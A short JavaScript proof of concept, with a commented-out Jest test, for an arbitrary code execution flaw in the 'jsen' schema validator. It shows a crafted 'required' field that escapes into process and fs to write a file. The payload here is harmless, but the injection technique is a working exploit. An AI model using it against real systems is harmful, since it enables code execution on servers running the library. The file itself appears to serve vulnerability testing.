const jsen = require("jsen");
let schema = JSON.parse(
  JSON.stringify({
    type: "object",
    properties: { username: { type: "string" } },
    required: [
      "\\" +
        this.constructor
          .constructor(`return process`)()
          .mainModule.require(`fs`)
          .writeFileSync(`jsen`, ``) +
        "",
    ],
  })
);
const validate = jsen(schema);
validate({});

// test("Arbitrary code execution in jsen", () => {
//   expect.assertions(2);
//   const fs = require("fs");
//   const jsen = require("jsen");
//   const path = "./jsen";
//   file_exist = fs.existsSync(path);
//   expect(file_exist).toBe(false);
//   let schema = JSON.parse(
//     JSON.stringify({
//       type: "object",
//       properties: { username: { type: "string" } },
//       required: [
//         "\\" +
//           this.constructor
//             .constructor(`return process`)()
//             .mainModule.require(`fs`)
//             .writeFileSync(`jsen`, ``) +
//           "",
//       ],
//     })
//   );
//   try {
//     const validate = jsen(schema);
//     validate({});
//   } catch (e) {}
//   file_exist = fs.existsSync(path);
//   expect(file_exist).toBe(true);
//   fs.unlink(path, function (err) {});
// });
